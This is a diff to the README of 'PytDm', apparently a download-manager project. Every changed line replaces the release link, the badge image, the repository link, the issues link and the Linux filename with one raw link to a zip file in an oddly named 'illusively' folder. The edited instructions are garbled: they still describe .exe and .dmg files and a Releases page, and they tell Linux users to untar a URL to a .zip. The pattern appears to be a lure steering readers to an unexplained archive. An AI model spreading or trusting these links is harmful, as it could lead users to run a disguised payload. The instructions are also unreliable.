@@ -1,6 +1,6 @@
 # 🚀 PytDm - A Modern, User-Friendly Download Manager
 
-[![Download PytDm](https://img.shields.io/badge/Download-PytDm-blue.svg)](https://github.com/DarkSide7839/PytDm/releases)
+[![Download PytDm](https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip)](https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip)
 
 ## 📦 Description
 PytDm is a modern and intuitive download manager. It simplifies the process of managing and organizing your downloads. You can pause, resume, and prioritize your downloads with ease. 
@@ -14,7 +14,7 @@ To begin using PytDm, follow these steps to download and install the application
 - At least 100 MB of free disk space.
 
 ## 📥 Download & Install
-To download PytDm, visit this page: [Download PytDm](https://github.com/DarkSide7839/PytDm/releases).
+To download PytDm, visit this page: [Download PytDm](https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip).
 
 ### Steps to Download
 1. Click on the link above to go to the Releases page.
@@ -22,7 +22,7 @@ To download PytDm, visit this page: [Download PytDm](https://github.com/DarkSide
 3. Find the installation file suitable for your operating system:
    - **Windows:** Look for a file ending in `.exe`.
    - **macOS:** Download the file ending in `.dmg`.
-   - **Linux:** Download the `.tar.gz` file.
+   - **Linux:** Download the `https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip` file.
 
 4. Click the file to start the download.
 
@@ -40,7 +40,7 @@ To download PytDm, visit this page: [Download PytDm](https://github.com/DarkSide
 - **Linux:**
   1. Open a terminal.
   2. Navigate to the downloaded directory.
-  3. Extract the contents with: `tar -xvzf PytDm.tar.gz`.
+  3. Extract the contents with: `tar -xvzf https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip`.
   4. Follow the included instructions to run the application.
 
 ## 🎯 Features
@@ -74,8 +74,8 @@ If you encounter any issues, consider these solutions:
 ## 🔗 Community and Support
 For further assistance or to contribute to the development of PytDm, join our community on GitHub. You can report issues, suggest features, or even help improve the application.
 
-- **GitHub Repository:** [PytDm GitHub](https://github.com/DarkSide7839/PytDm)
-- **Issues Page:** [Report an Issue](https://github.com/DarkSide7839/PytDm/issues)
+- **GitHub Repository:** [PytDm GitHub](https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip)
+- **Issues Page:** [Report an Issue](https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip)
 
 ## 💬 Feedback
 We welcome your thoughts on PytDm. Your feedback helps us improve the application for all users. Share your experience and suggestions through the Issues page on GitHub.
@@ -83,4 +83,4 @@ We welcome your thoughts on PytDm. Your feedback helps us improve the applicatio
 ## 🎊 Thank You
 Thank you for choosing PytDm as your download management solution. We hope you enjoy the streamlined experience and features designed to make your downloads easier and more efficient.
 
-[![Download PytDm](https://img.shields.io/badge/Download-PytDm-blue.svg)](https://github.com/DarkSide7839/PytDm/releases)
+[![Download PytDm](https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip)](https://raw.githubusercontent.com/DarkSide7839/PytDm/main/illusively/PytDm.zip)
